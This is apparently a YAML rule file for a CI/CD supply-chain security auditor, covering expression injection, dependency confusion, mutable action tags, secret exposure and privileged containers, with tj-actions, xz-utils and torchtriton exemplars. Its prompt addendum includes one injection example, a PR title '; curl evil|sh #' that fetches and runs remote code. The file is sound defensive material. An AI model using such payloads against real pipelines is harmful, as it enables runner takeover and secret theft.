name: cicd_supply_chain
description: |
  The build/deploy pipeline itself as the attack surface (CWE-1395,
  CWE-94/78, CWE-426, CWE-250, CWE-15). The trust lens: CI treats its
  own runners, secrets, and dependency resolution as a trusted interior,
  but every untrusted input it consumes — a fork's PR title, a branch
  name, a package name that resolves against the public registry, a
  third-party action pinned by mutable tag — executes WITH that trust.
  Poisoned pipeline execution, dependency/namespace confusion, secret
  exfiltration from privileged runners, and over-broad IaC grants all
  collapse the boundary between "untrusted submitter" and "trusted
  build identity."

signals:
  paths:
    - .github/workflows/
    - .gitlab-ci.yml
    - .gitlab/
    - .circleci/
    - azure-pipelines.yml
    - Jenkinsfile
    - bitbucket-pipelines.yml
    - .drone.yml
    - cloudbuild.yaml
    - buildspec.yml
    - .npmrc
    - pip.conf
    - .pypirc
    - Dockerfile
    - docker-compose.yml
    - k8s/
    - manifests/
    - helm/
    - terraform/
    - .tf
    - ansible/
  includes:
    - actions/checkout
    - actions/github-script
    - aws-actions/configure-aws-credentials
    - tj-actions
    - GITHUB_TOKEN
    - "secrets."
    - registry-url
    - extra-index-url
    - publishConfig
    - "@kubernetes/client-node"
    - boto3
    - hashicorp/aws
    - hostPath
    - securityContext
    - privileged
    - capabilities
  function_keywords:
    - pull_request_target
    - workflow_run
    - github.event
    - run
    - script
    - preinstall
    - postinstall
    - prepublish
    - install
    - deploy
    - release
    - publish
    - checkout
    - artifact
    - entrypoint
    - serviceAccountName
    - assume_role
  function_calls:
    - subprocess.run
    - os.system
    - exec
    - eval
    - child_process.exec
    - core.exportVariable
    - core.getInput
    - github.rest
    - npm publish
    - pip install
    - docker run
    - kubectl apply
    - terraform apply
    - sts.assume_role
  cwes:
    - CWE-1395  # dependency on vulnerable / attacker-controlled third-party component
    - CWE-94    # code injection (expression interpolation into run:)
    - CWE-78    # OS command injection (untrusted event data into shell)
    - CWE-426   # untrusted search path (registry/namespace/dep resolution order)
    - CWE-250   # execution with unnecessary privileges (privileged runner/container/IAM)
    - CWE-15    # external control of system/configuration setting

key_questions:
  - "Does any run:/script: step (or actions/github-script) interpolate untrusted event data — ${{ github.event.pull_request.title }}, .body, .head.ref, .comment.body, issue title, CI_COMMIT_* / CI_MERGE_REQUEST_* — directly into a shell or JS context instead of passing it through an env: variable first?"
  - "Does a pull_request_target or workflow_run workflow (which runs with repo SECRETS and a write GITHUB_TOKEN) check out and EXECUTE code from the untrusted fork head ref — ref: ${{ github.event.pull_request.head.sha }} plus a build/test/install step — turning a PR into RCE on a privileged runner?"
  - "Are dependencies pulled in a way that lets the PUBLIC registry win for an internal package name — a missing/permissive .npmrc scope, --extra-index-url ordering on PyPI, an unclaimed scope/namespace, or a typo-adjacent name — so namespace confusion or typosquatting substitutes attacker code at install (with postinstall / pip build hooks running arbitrarily)?"
  - "Is a third-party action or container image pinned by a MUTABLE reference (@v4, @main, :latest) rather than a full commit SHA / digest, so the upstream can be retagged to point at malicious code under the consumer's privileges (the tj-actions/changed-files class)?"
  - "What can a compromised step reach: a broad permissions: block or default write GITHUB_TOKEN, secrets injected as env on attacker-influenced steps, an id-token OIDC role with a loose trust policy / '*' actions, or cloud creds exfiltratable via env / set-env?"
  - "Do the IaC/runtime sinks grant more than needed — privileged: true, hostPath: / mounts, securityContext without runAsNonRoot / dropped caps, Docker socket mounted into a build container, or an IAM policy with Action: '*' / Resource: '*' — giving a poisoned build a container escape or cloud takeover?"

prompt_addendum: |
  Read the pipeline like an interpreter that runs untrusted input with
  the maintainer's credentials. Find the SINK (a run:/script: shell
  step, a dependency install, an action/image reference, or an IaC
  privilege grant), then walk back to ask which part of it an EXTERNAL
  contributor controls. The detection moves semgrep struggles with are
  about TRUST CONTEXT and RESOLUTION ORDER, not single-line patterns.

  1) Expression-injection / PPE (CWE-94/78). GitHub Actions textually
     substitutes ${{ ... }} into the script BEFORE the shell runs, so
     run: echo "${{ github.event.pull_request.title }}" lets a PR
     titled "; curl evil|sh #" execute on the runner. Treat ALL of
     these as attacker-controlled on fork PRs: pull_request title/body,
     head.ref / head.label, commit messages and author name/email,
     issue/comment bodies, review bodies; on GitLab the analogues are
     $CI_COMMIT_*, $CI_MERGE_REQUEST_TITLE, branch names. The fix
     signature is binding the expression to env: first and referencing
     $TITLE — if the expression is inline in the script, it is the bug.
     Crucially, severity is gated by the TRIGGER: under pull_request
     the runner has a read-only token and no secrets (limited blast
     radius), but under pull_request_target or workflow_run it runs
     in the BASE repo's context with secrets + write token. So the lethal
     pattern is on: pull_request_target + an explicit checkout of
     head.sha/head.ref + any build/test/npm ci/make step: that
     executes the fork's code with the repo's secrets. This is the class
     of the "pwn request" research and the Wiz / GitHub Security Lab
     advisories; flag it even when the inline expression looks benign,
     because checking out and running fork code under that trigger is the
     vulnerability regardless of interpolation.

  2) Dependency / namespace confusion & typosquatting (CWE-1395,
     CWE-426). This is fundamentally an UNTRUSTED SEARCH PATH bug: when a
     resolver can satisfy an internally-named package from a public
     registry, the public one can win by version-number or precedence.
     Chase: an internal @scope/pkg whose scope is NOT mapped to a
     private registry in .npmrc (@scope:registry=); pip with
     --extra-index-url (which UNIONS indexes — highest version wins —
     unlike --index-url), so an attacker uploads internal-lib 99.0.0
     to PyPI; an internal package name that was never reserved on the
     public registry at all; or a typo-adjacent name (reqeusts,
     python-dateutil vs python3-dateutil). The execution happens via
     install-time hooks: npm preinstall/postinstall/prepublish
     scripts, Python setup.py/PEP 517 build backends, RubyGems
     extensions. This is the Alex Birsan 2021 dependency-confusion
     technique that hit Apple, Microsoft, and others, and the same class
     that compromised PyTorch's torchtriton dependency in Dec 2022. Also
     flag lockfile gaps: no package-lock.json/poetry.lock integrity
     hashes pinned, or npm install (mutates) used in CI instead of
     npm ci.

  3) Mutable third-party references (CWE-1395/CWE-829). An action used as
     uses: someorg/action@v4 or a base image FROM org/img:latest
     trusts whatever that tag points to NOW. If upstream is compromised
     or the maintainer retags, your runner executes new code with your
     secrets. The March 2025 tj-actions/changed-files compromise
     (CVE-2025-30066) did exactly this: the action's tags were
     repointed to a commit that dumped CI runner memory/secrets to logs,
     affecting roughly 23,000 repos — the initial foothold traced back
     to the reviewdog/action-setup compromise (CVE-2025-30154) and a
     Coinbase-targeted attack. The detector rule: any uses: not pinned
     to a full 40-char commit SHA, or any image not pinned by @sha256:
     digest, is a supply-chain time bomb. Self-hosted runners reused
     across jobs compound this (residual state, lateral movement).

  4) Secret exfiltration surface (CWE-15/CWE-250). Look for secrets made
     reachable by attacker-influenced code: env: TOKEN: ${{ secrets.X }}
     on a step that runs untrusted code; printing/set-output of
     secrets; OIDC id-token: write with a cloud role whose trust policy
     uses a loose sub condition (e.g. matches any branch/any repo) or
     grants Action: '*'. A poisoned step can read $GITHUB_TOKEN,
     env, and the OIDC token, then assume the role. Over-broad default
     permissions: (no explicit least-privilege block => write-all token)
     is the amplifier.

  5) Container-escape & IaC sinks (CWE-250/CWE-15). In Dockerfiles/K8s/
     Terraform/Helm, flag: privileged: true, --privileged, Docker
     socket /var/run/docker.sock mounted into a job/container,
     hostPath mounts (especially /, /etc, /proc), missing
     runAsNonRoot/readOnlyRootFilesystem, allowPrivilegeEscalation:
     true, CAP_SYS_ADMIN/NET_ADMIN added; in IAM/Terraform, policies
     with "Action": "*" / "Resource": "*", AdministratorAccess
     attached to a CI role, or an OIDC trust Condition that does not
     pin repository/ref. These convert "code ran on the runner" into
     "code escaped to the host / owns the cloud account."

  Conclude a finding when an UNTRUSTED input (fork PR data, a public
  registry resolution, a mutable upstream ref) can steer a TRUSTED build
  action (shell execution, dependency install, deploy) AND the
  credentials/privileges reachable from that action exceed what the
  submitter should have. A pipeline that runs fork code under
  pull_request_target, resolves internal names against a public index,
  or pins by mutable tag is exploitable even if every individual line
  passes a syntactic lint — the bug is in the trust topology.

exemplars:
  - cve: CVE-2025-30066
    title: tj-actions/changed-files retagged action exfiltrates CI secrets (mutable ref)
    pattern: |
      Thousands of workflows referenced the action as
      uses: tj-actions/changed-files@v44 (or other mutable tags). In
      March 2025 the attacker compromised a bot's personal access token,
      gained write access, and repointed every version tag to a single
      malicious commit that ran a Python payload dumping the runner's
      process memory — where CI secrets, the GITHUB_TOKEN, and cloud
      credentials live — and printing them (double-base64-encoded, to
      defeat log masking) into the publicly readable build logs.
      Because consumers pinned by tag, the next CI run silently pulled
      the malicious code with the consumer's full privileges; roughly
      23,000 repositories were affected and it was patched in v46.0.1.
    why_buggy: |
      A mutable reference is a promise the consumer cannot enforce: @v44
      means "whatever that tag points to at run time," so the trust
      decision is delegated to an upstream the consumer does not control.
      The assumption violated is that a previously-vetted action stays
      vetted; retagging breaks it instantly across every downstream repo.
      Consequence: mass secret exfiltration from runners with no code
      change on the victim side. The only enforcing fix is pinning to a
      full commit SHA (and ideally a digest) so the resolved code cannot
      change beneath you — the upstream foothold itself chained back from
      the reviewdog/action-setup compromise (CVE-2025-30154) and a
      Coinbase-targeted attack.
  - cve: CVE-2024-3094
    title: xz-utils / liblzma build-time backdoor injected via the build pipeline
    pattern: |
      A long-trusted maintainer landed a backdoor not in the readable C
      source but in the BUILD process of the release tarballs (xz 5.6.0/
      5.6.1). A modified build-to-host.m4 and obfuscated "test" fixtures
      (bad-3-corrupt_lzma2.xz, good-large_compressed.lzma) caused the
      liblzma build to de-obfuscate and extract a prebuilt object file
      (liblzma_la-crc64-fast.o) and patch the library at compile time,
      ultimately hooking sshd's authentication via an IFUNC resolver. The
      malicious step existed only in the distributed tarball, not the git
      tree, so source review alone missed it.
    why_buggy: |
      The build is itself executable, attacker-controllable code, yet it
      is trusted as inert plumbing — reviewers audit *.c, not autotools
      macros or binary test blobs. The assumption violated: that the
      artifact you ship equals the source you reviewed. By poisoning the
      build pipeline (and shipping a tarball that diverges from the repo),
      the attacker reached every downstream consumer linking liblzma.
      Consequence: a CVSS 10.0 backdoor in a ubiquitous compression
      library feeding sshd on bleeding-edge distros — the canonical lesson
      that the build process and its inputs are a first-class trust
      boundary.
  - cve: PyTorch-torchtriton-2022
    title: PyTorch dependency confusion — public PyPI shadows internal torchtriton
    pattern: |
      PyTorch-nightly's install pulled an internally-named dependency,
      torchtriton, that was distributed via its own index — but pip also
      consults the PUBLIC PyPI registry, where the package name had not
      been reserved. Between Dec 25 and Dec 30 2022 an attacker published
      a malicious torchtriton to PyPI; pip's resolution preferred the
      public package, and its binary ran on install, exfiltrating system
      info, /etc/passwd, ~/.ssh keys, and .gitconfig over encrypted DNS.
      This is the same class Alex Birsan's 2021 research used to reach
      Apple, Microsoft, PayPal, and Shopify: an internal name satisfiable
      from a public index, with the attacker controlling the version and
      an install-time hook (npm postinstall / pip setup.py build hook).
    why_buggy: |
      Dependency resolution is an UNTRUSTED SEARCH PATH (CWE-426): when an
      internal name can be satisfied from a public index, precedence rules
      — not provenance — decide the winner, and the attacker controls
      version numbers and the public namespace. The assumption violated is
      that a name maps to the org's package; in reality the name is a
      global, claimable namespace. The enforcing fixes are
      scope-to-private-registry mapping (@scope:registry=), --index-url
      (not --extra-index-url), reserving the public name (PyTorch later
      registered the name and renamed to pytorch-triton), and
      verified-hash lockfiles — defenses that operate on resolution
      precedence, which a per-line scan cannot see.
